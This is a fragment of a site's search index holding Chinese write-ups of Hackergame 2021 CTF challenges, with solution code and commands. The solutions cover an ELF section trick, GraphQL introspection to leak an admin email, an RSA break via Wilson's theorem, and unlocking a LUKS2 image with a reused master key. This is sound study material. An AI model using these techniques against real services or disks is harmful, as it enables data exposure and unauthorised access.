\u52a9\u529b\u5927\u7ea2\u5305"},{"location":"writeups/hackergame2021/#amnesia","text":"","title":"Amnesia"},{"location":"writeups/hackergame2021/#_7","text":"\u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world!\uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002 \u7f16\u8bd1\u6307\u4ee4\uff1a gcc -O file.c -m32 \u8fd0\u884c\u6307\u4ee4\uff1a ./a.out \u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002 ELF\uff08Executable and Linkable Format\uff09\u662f Linux \u4e0b\u5e38\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u4e0d\u540c\u7684\u8282\uff1a .text \u8282\uff1a\u7a0b\u5e8f\u8fd0\u884c\u9700\u8981\u7684\u4ee3\u7801 .data \u8282\uff1a\u5b58\u653e\u53ef\u4fee\u6539\u7684\u6570\u636e\uff0c\u4e00\u822c\u662f\u975e const \u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u53d8\u91cf .rodata \u8282\uff1a\u5373 read only data\uff0c\u4e00\u822c\u662f\u5e38\u91cf\u6216\u8005\u5b57\u7b26\u4e32 .bss \u8282\uff1a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u53d8\u91cf \u2026\u2026 \u800c\u8fd9\u9053\u9898\u76ee\u5219\u662f\u5728\u7f16\u8bd1\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 a.out \u540e\uff0c\u6e05\u7a7a .data \u548c .rodata \u9996\u5148\u4e0d\u59a8\u6b63\u5e38\u7f16\u5199\u4e00\u4e2a\u8f93\u51fa \u201cHello, world!\u201d \u7684\u7a0b\u5e8f\uff1a printf ( \"Hello, world! \\n \" ); \u7136\u540e\u7f16\u8bd1\uff0c\u518d\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u53d1\u73b0\uff0c\u6b64\u65f6\u7684 \"Hello, world!\" \u88ab\u653e\u5230\u4e86 .rodata \u8282\u4e2d\uff0c\u4f1a\u88ab\u6e05\u9664\u6389\uff0c\u6240\u4ee5\u8fd9\u6837\u5199\u4e0d\u884c \u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u4f1a\u88ab\u653e\u5230 .rodata \u4e2d\u6e05\u9664\uff0c\u5199\u6210\u5168\u5c40\u53d8\u91cf\u53c8\u4f1a\u653e\u5230 .data \u4e2d \u4f46\u662f\uff0c\u5982\u679c\u5199\u6210\u5c40\u90e8\u53d8\u91cf\u5462\uff1a char str [] = \"Hello, world! \\n \" ; printf ( str ); \u7f16\u8bd1\uff0c\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u6b21\u7684\u5b57\u7b26\u4e32\u76f4\u63a5\u5199\u5230\u4e86 .text \u8282\u4e2d\uff0c\u5220\u6389\u4e86 .data .rodata \u4e5f\u6ca1\u6709\u5f71\u54cd \u6240\u4ee5\u628a\u8fd9\u4e2a\u4ee3\u7801\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u8f93\u51fa \u201cHello, world!\u201c \u62ff\u5230 flag \u4e86 \u6e05\u9664\u8bb0\u5fc6\u76f4\u63a5\u628a .text \u8282\u5168\u5220\u6389\u4e86\uff0c\u60f3\u4e86\u5f88\u4e45\u4e5f\u4e0d\u77e5\u9053\u548b\u641e\uff0c\u867d\u7136\u53ef\u4ee5 __attribute__ ((section (\"...\"))) \u6765\u628a\u51fd\u6570\u6216\u53d8\u91cf\u585e\u5230\u6307\u5b9a\u7684\u8282\u4e2d\u3002\u4f46\u8fd8\u662f\u4e0d\u6e05\u695a\u8981\u600e\u4e48\u89e3\u51b3\u6bb5\u9519\u8bef\u7684\u95ee\u9898qwq","title":"\u8f7b\u5ea6\u5931\u5fc6"},{"location":"writeups/hackergame2021/#_8","text":"\u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002 \u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f \u9898\u76ee\u4fe1\u606f\u7ed9\u7684\u5f88\u5145\u5206\uff0c\u7528\u7684\u662f GraphQL\uff0c\u8981\u7528\u5176\u5f97\u5230 admin \u7684\u90ae\u7bb1 \u6ca1\u63a5\u89e6\u8fc7 GraphQL\uff0c\u6240\u4ee5\u76f4\u63a5\u5fc5\u5e94\uff08\u9003 \u67e5\u5230\u4e86\u5f88\u591a\u6709\u7528\u7684\u4e1c\u897f\uff1a GraphQL\u5b98\u7f51 \uff1a\u4e86\u89e3\u4e00\u4e0b GraphQL \u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u8981\u600e\u4e48\u7528 GraphiQL \uff1a\u4e00\u4e2a\u8fdb\u884c GraphQL \u67e5\u8be2\u7684 GUI \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e GraphQL Voyager \uff1a\u53ef\u89c6\u5316\u73b0\u5b9e GraphQL \u5185\u7701\u51fa\u7684\u7ed3\u6784 \u7b80\u800c\u8a00\u4e4b\uff0cGraphQL \u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e00\u6b21 query \u8bf7\u6c42\u67e5\u8be2\u591a\u4e2a\u8d44\u6e90\u7684 API \u6a21\u5f0f\uff0c\u53ea\u8981 \u7f51\u5740/graphql?query=... \u5c31\u53ef\u4ee5\u5b9e\u73b0\u67e5\u8be2 \u6709\u4e9b\u4f7f\u7528 GraphQL \u7684\u7f51\u7ad9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8bbf\u95ee \u7f51\u5740/graphiql \u5f97\u5230\u67e5\u8be2\u7684 GUI \u4f46\u662f\u672c\u9898\u4e2d\u7981\u6b62\u4e86\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 GraphiQL \u8f6f\u4ef6\u6765\u8fdb\u884c\u67e5\u8be2 \u5728\u7b2c\u4e09\u4e2a\u94fe\u63a5\u4e2d\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u53ef\u4ee5\u5229\u7528 GraphQL \u7684\u5185\u7701\u67e5\u8be2\u6765\u6cc4\u9732\u51fa\u5185\u90e8\u7684\u7ed3\u6784\uff0c\u628a\u5176\u4e2d\u7684\u67e5\u8be2\u8bed\u53e5\u4e22\u5230 GraphiQL \u4e2d\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }} \u7136\u540e\u628a\u7ed3\u679c\u4e22\u5230 GraphQL Voyager \u4e2d\u5c31\u53ef\u4ee5\u5f97\u5230\u53ef\u89c6\u5316\u7684\u7ed3\u6784\uff1a \u6240\u4ee5\u53ea\u9700\u8981\u6839\u636e id query \u4e00\u4e0b user \u5c31\u53ef\u4ee5\u4e86\uff1a query { user ( id : 1 ) { privateEmail , } } >>> { \"data\" : { \"user\" : { \"privateEmail\" : \"flag{...}\" } } }","title":"\u56fe\u4e4b\u4e0a\u7684\u4fe1\u606f"},{"location":"writeups/hackergame2021/#easy-rsa","text":"\u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e\uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002 \u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002 \u8c22\u9080\uff0c\u6ca1\u6709\u6570\u7406\u57fa\u7840 \u770b\u4ee3\u7801\uff01 e = 65537 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy . nextprime (( math . factorial ( y )) % x ) # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81 return value_p def get_q (): value = [ getPrime ( 256 )] for i in range ( 1 , 10 ): value . append ( sympy . nextprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range ( 10 ): n = n * value [ i ] q = getPrime ( 512 ) value_q = pow ( q , e , n ) print ( \"value_q = \" , value_q ) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( q ) # this destroyes the rsa cryptosystem p = get_p () q = get_q () m = int . from_bytes ( open ( \"flag.txt\" , \"rb\" ) . read (), \"big\" ) c = pow ( m , e , p * q ) print ( \"c = \" , c ) # c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 \u53ef\u4ee5\u770b\u5230\uff0c\u5176\u4e2d\u8981\u89e3\u51b3\u7684\u5c31\u662f get_p() \u4e2d y! % x \u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4ee5\u53ca get_q() \u4e2d q \u662f\u54ea\u4e2a\u968f\u673a\u7684512\u4f4d\u8d28\u6570\u7684\u95ee\u9898 get_p : \u4ee3\u7801\u91cc\u4e5f\u7ed9\u4e86 Hint\uff0c\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\u3002x \u548c y \u90fd\u5f88\u5927\uff0c\u4f46\u662f\u4e24\u4e2a\u7684\u5dee\u5e76\u4e0d\u5927\uff1b\u800c\u4e14\u53ef\u4ee5\u4e22\u5230 python \u91cc\u9a8c\u8bc1\u51fa x \u662f\u4e00\u4e2a\u8d28\u6570 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \u5a01\u5c14\u900a\u5b9a\u7406 \u4e5f\u67e5\u5230\u4e86\u5a01\u5c14\u900a\u5b9a\u7406\u5728 RSA \u9898\u76ee\u4e2d\u7684\u5e94\u7528\uff1a BUU-RSA [RoarCTF2019]babyRSA \u8981\u6c42 y! % x\uff08x\u662f\u8d28\u6570\uff09 \u6839\u636e\u5a01\u5c14\u900a\u5b9a\u7406\uff0c\u6709 \\[ (x - 1)! \\equiv -1\\pmod{x} \\] \u6240\u4ee5\uff1a \\[ y!\\times \\frac{(x - 1)!}{y!}\\equiv -1\\pmod{x} \\] \u4ee4 \\(k = \\dfrac{(x - 1)!}{y!} = (y+1)(y+2)...(x-1)x\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[ y!\\equiv -\\mathrm{inv}(k, x)\\pmod{x} \\] \uff08\u5176\u4e2d \\(\\mathrm{inv}(k, x)\\) \u8868\u793a\u6a21 x \u4e0b k \u7684\u9006\u5143\uff09 \u6240\u4ee5\u91cd\u5199 get_p() \u5373\u53ef\u6b63\u786e\u7684\u5f97\u5230 p\uff1a def get_p (): x = ... y = ... k = 1 for i in range ( y + 1 , x ): k = ( k * i ) % x res = ( - gmpy2 . invert ( k , x )) % x return sympy . nextprime ( res ) get_q : \u76f8\u6bd4\u6765\u8bf4\uff0cget_q \u5c31\u6ca1\u90a3\u4e48\u9700\u8981\u6280\u5de7\u4e86 \u7ed9\u51fa\u4e86 value[-1] \u7684\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 sympy.prevprime \u9006\u63a8\u51fa\u6574\u4e2a value \u6570\u7ec4 value = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967 ] for i in range ( 1 , 10 ): value . append ( sympy . prevprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) \u540e\u9762\u8ba1\u7b97 value_q \u7ec6\u770b\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a RSA \u7b97\u6cd5\uff1a q\uff1a\u5bc6\u6587 e\uff1a\u79c1\u94a5 value_q\uff1a\u660e\u6587 n\uff1a\u5c31\u662f n\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u662f\u4e24\u4e2a\u8d28\u6570\u76f8\u4e58\uff0c\u662f\u5341\u4e2a\u8d28\u6570\u76f8\u4e58 \u5341\u4e2a\u8d28\u6570\u76f8\u4e58\u5f97\u5230 n \u7684 RSA \u7b97\u6cd5\u4e5f\u4e00\u6837\uff0c\u56e0\u4e3a RSA \u7684\u6b63\u786e\u6027\u5e76\u6ca1\u6709\u8981\u6c42 n \u4e00\u5b9a\u662f\u4e24\u4e2a\u5927\u8d28\u6570\u76f8\u4e58\uff0c\u8fd9\u6837\u53ea\u662f\u96be\u4ee5\u7834\u89e3\u4fdd\u8bc1\u5b89\u5168\u6027 \u89e3\u51b3\u8fd9\u4e2a\u540c\u6837\u4e5f\u662f\u9700\u8981\u516c\u94a5 d\uff0c\u6240\u4ee5\u9700\u8981 phi(n) \u6839\u636e \u6b27\u62c9\u51fd\u6570 \u7684\u6027\u8d28\uff0cphi(n) \u7b49\u4e8e n \u7684\u6240\u6709\u8d28\u56e0\u6570\u51cf\u4e00\u7684\u79ef \u5373 phi(n) = (value[0] - 1) * (value[1] - 1) * ... * (value[9] - 1) \u518d\u89e3\u5bc6\u5373\u53ef\u5f97\u5230\u5bc6\u6587 q\uff0c\u7136\u540e\u4e5f\u5c31\u5f97\u5230\u4e86 get_q \u7684\u7ed3\u679c n = phi = 1 for i in range ( 10 ): n = n * value [ i ] phi *= ( value [ i ] - 1 ) value_q = ... d = pow ( e , - 1 , phi ) q = pow ( value_q , d , n ) return sympy . nextprime ( q ) flag : \u641e\u5b9a\u4e86 get_p \u548c get_q \u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e3\u51fa flag \u4e86\uff1a e = 65537 p = get_p () q = get_q () c = ... d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) m = pow ( c , d , p * q ) print ( int . to_bytes ( m , 30 , byteorder = \"big\" ))","title":"Easy RSA"},{"location":"writeups/hackergame2021/#u","text":"\uff08\u672c\u6765\u633a\u597d\u505a\u7684\u4e00\u9053\u9898\uff0c\u600e\u4e48\u9898\u7ed9\u7684\u63d0\u793a\u6211\u5c31\u786c\u662f\u6ca1\u9886\u4f1a\u5230\uff09 \u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002 \u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123\u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d \u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d \u4e00\u5171\u7ed9\u4e86\u4e24\u4e2a img \u6587\u4ef6\uff0c\u901a\u8fc7 file \u53ef\u4ee5\u770b\u51fa\u90fd\u662f DOS/MBR boot sector $ file *.img day1.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) day2.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) \u6240\u4ee5\u5148\u76f4\u63a5 7z \u63d0\u53d6\uff0c\u5f97\u5230\u4e24\u4e2a\u65b0\u7684 img\uff0c\u518d file\uff1a $ file *.img My Disk.img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 My Disk 2 .img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 \u53d1\u73b0\u90fd\u662f LUKS encrypted file \u5728 Kali Linux \u91cc\u5c1d\u8bd5\u76f4\u63a5\u6302\u8f7d\u7b2c\u4e00\u4e2a img\uff0c\u8981\u6c42\u8f93\u5165\u5bc6\u7801\uff0c\u628a\u9898\u7ed9\u7684\u5bc6\u7801\u8f93\u5165\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u8bfe\u4ef6\u201d \u4ee5\u4e0a\u90fd\u662f\u5df2\u77e5\u7684\u8bd5\u9a8c\u90e8\u5206\uff0c\u771f\u6b63\u8981\u505a\u7684\u662f\u89e3\u5f00\u7b2c\u4e8c\u4e2a\u672a\u77e5\u5bc6\u7801\u7684 LUKS img \u5df2\u77e5\u78c1\u76d8\u7684\u52a0\u5bc6\u4f7f\u7528\u7684\u662f luks2\uff0c\u5728\u7f51\u4e0a\u67e5\u4e86\u7834\u89e3 luks2 \u4e4b\u7c7b\u7684\u90fd\u8bf4 luks2 \u4e0d\u53ef\u7834\u89e3 \uff0c\u6216\u8005\u662f\u4f7f\u7528\u5df2\u77e5\u7684\u5bc6\u7801\u5b57\u5178\u6765\u7206\u7834 \u4f46\u662f\u9898\u91cc\u8bf4\u4e86 \u201c \u968f\u673a\u751f\u6210 \u7684\u5f3a\u5bc6\u7801\u201d\uff0c\u6240\u4ee5\u4e5f\u662f\u6ca1\u6709\u5bc6\u7801\u5b57\u5178\u7684 \u5176\u5b9e\u8fd9\u9053\u9898\u7684\u6700\u5927\u63d0\u793a\u5c31\u5728\u4e8e\u5b83\u7ed9\u4e86\u4e24\u4e2a img\uff0c\u65e2\u7136\u7b2c\u4e00\u4e2a img \u6253\u5f00\u540e\u4ec5\u4ec5\u662f\u4e00\u4e2a\u8bfe\u4ef6\uff0c\u5982\u679c\u5b83\u7684\u7528\u5904\u4ec5\u4ec5\u662f\u7528\u6765\u8bd5\u9a8c luks \u600e\u4e48\u6253\u5f00\u7684\u8bdd\uff0c\u6839\u672c\u5b83\u6ca1\u5fc5\u8981\u7ed9\u51fa \u6240\u4ee5\u7b2c\u4e00\u4e2a img \u80af\u5b9a\u8fd8\u662f\u6709\u7528\u7684\u3002 \u518d\u770b\u9898\u76ee\uff0c\u53cd\u590d\u8bf4\u4e86 U \u76d8\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a img \u5e94\u8be5\u662f\u540c\u4e00\u4e2a U \u76d8\u7684\u955c\u50cf\u6587\u4ef6\uff0c\u53ea\u662f\u66f4\u6539\u4e86\u5bc6\u7801\u800c\u5df2\uff08file \u770b\u5230\u7684 uuid \u4e5f\u662f\u4e00\u81f4\u7684\uff09 \u4e8e\u662f\u7ee7\u7eed\u5fc5\u5e94\uff0c\u53d1\u73b0\u540c\u4e00\u4e2a\u78c1\u76d8\u7684 master-key \u662f\u4e00\u6837\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u7528 master-key \u6765\u6dfb\u52a0\u5bc6\u7801\u6062\u590d\u78c1\u76d8\uff08\u89c1\uff1a 10 Linux cryptsetup Examples for LUKS Key Management \uff09 \u6240\u4ee5\u5c31\u8ddf\u7740\u6587\u7ae0\u91cc\u7684\u505a\u6cd5\uff0c\u4ece\u7b2c\u4e00\u4e2a img \u4e2d\u63d0\u53d6\u51fa master-key\uff0c\u7136\u540e\u7528\u5b83\u6765\u63d0\u4f9b AddKey \u7684\u6743\u9650\u3002\u6dfb\u52a0\u4e86\u65b0 passphrase \u540e\u5c31\u53ef\u4ee5\u7528\u65b0\u5bc6\u7801\u6253\u5f00\u78c1\u76d8\u4e86\uff1a $ cryptsetup luksDump --dump-master-key MyDisk.img # \u8f93\u51fa master-key ... MK dump: be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a $ cat \"be...9a\" > master_key.txt # \u5b58\u5165\u6587\u4ef6 $ xxd -r -p master_key.txt master_key.bin # \u8f6c\u4e3a\u4e8c\u8fdb\u5236 $ cryptsetup luksAddKey MyDisk2.img --master-key-file < ( cat master_key.bin ) # \u6dfb\u52a0\u5bc6\u7801 Enter new passphrase for key slot: # \u8f93\u5165\u65b0\u5bc6\u7801\u5373\u53ef\uff0c\u56e0\u4e3amaster-key-file\u76f8\u5f53\u4e8e\u63d0\u4f9b\u4e86\u539f\u59cb\u5bc6\u7801 Verify passphrase: \uff08\u4e00\u5b9a\u8981\u7528 root \u6743\u9650\u624d\u53ef\u4ee5\u52a0\u5bc6\u7801\uff09 \u7136\u540e\u6302\u8f7d\u3001\u8f93\u5165\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 flag.txt \u4e86","title":"\u52a0\u5bc6\u7684 U \u76d8"},{"location":"writeups/hackergame2021/#_9","text":"\u867d\u7136\u8fd9\u662f\u4f60\u7684\u9910\u5385\uff0c\u4f46\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u5728\u53a8\u623f\u5de5\u4f5c\u3002\u673a\u5668\u4eba\u7cbe\u786e\u5730\u6309\u7167\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u5728\u53a8\u623f\u4e2d\u79fb\u52a8\uff0c\u4ece\u7269\u54c1\u6e90\u53d6\u51fa\u98df\u6750\uff0c\u6309\u7167\u83dc\u8c31\u7684\u987a\u5e8f\u628a\u98df\u6750\u4f9d\u6b21\u653e\u5165\u9505\u5185\u3002 \u673a\u5668\u4eba\u4e0d\u9700\u8981\u4f11\u606f\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u665a\u4e0a\u7684\u65f6\u95f4\u6765\u5b66\u4e60\u4f60\u6559\u7ed9\u5b83\u7684\u7a0b\u5e8f\uff0c\u5728\u6b64\u4e4b\u540e\u4f60\u5c31\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u8ba9\u673a\u5668\u4eba\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u7684\u6bcf\u4e00\u6b65\u6267\u884c\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u4f60\u68c0\u67e5\u673a\u5668\u4eba\u505a\u83dc\u7684\u8fc7\u7a0b\u3002 \u53e6\u5916\u4e3a\u4e86\u7b26\u5408\u98df\u54c1\u5b89\u5168\u6cd5\u7684\u8981\u6c42\uff0c\u8d5b\u535a\u53a8\u623f\u4e2d\u7684\u673a\u5668\u4eba\u540c\u4e00\u65f6\u95f4\u624b\u91cc\u53ea\u80fd\u62ff\u4e00\u79cd\u98df\u7269\uff0c\u6bcf\u6b21\u505a\u83dc\u524d\u90fd\u5fc5\u987b\u6267\u884c\u6e05\u7406\u53a8\u623f\u7684\u64cd\u4f5c\uff0c\u628a\u5404\u5904\u7684\u98df\u7269\u6b8b\u6e23\u6e05\u7406\u6389\uff0c\u7136\u540e\u56de\u5230\u53a8\u623f\u89d2\u843d\u5f85\u547d\u3002 \u6bcf\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4e0d\u540c\uff0c\u4f46\u4e5f\u8bb8\u4e5f\u5b58\u5728\u4e00\u4e9b\u89c4\u5f8b\u3002 \u5bf9\u673a\u5668\u4eba\u7f16\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4\u6709\uff08n, m \u4e3a\u6574\u6570\u53c2\u6570\uff0c\u7a0b\u5e8f\u7684\u884c\u53f7\u4ece 0 \u5f00\u59cb\uff0c\u6ce8\u610f\u6307\u4ee4\u4e2d\u9700\u8981\u6b63\u786e\u4f7f\u7528\u7a7a\u683c\uff09\uff1a \u5411\u4e0a n \u6b65 \u5411\u4e0b n \u6b65 \u5411\u5de6 n \u6b65 \u5411\u53f3 n \u6b65 \u653e\u4e0b n \u4e2a\u7269\u54c1 \u62ff\u8d77 n \u4e2a\u7269\u54c1 \u653e\u4e0b\u76d8\u5b50 \u62ff\u8d77\u76d8\u5b50 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0b\u8df3\u8f6c m \u884c \u8d76\u7d27\u8fdb\u5165\u8d5b\u535a\u53a8\u623f\u5f00\u59cb\u505a\u83dc\u5427\uff01 \u521a\u770b\u9898\u8fd8\u662f\u633a\u61f5\u7684\uff0c\u60f3\u4e86\u597d\u534a\u5929\u624d\u660e\u767d 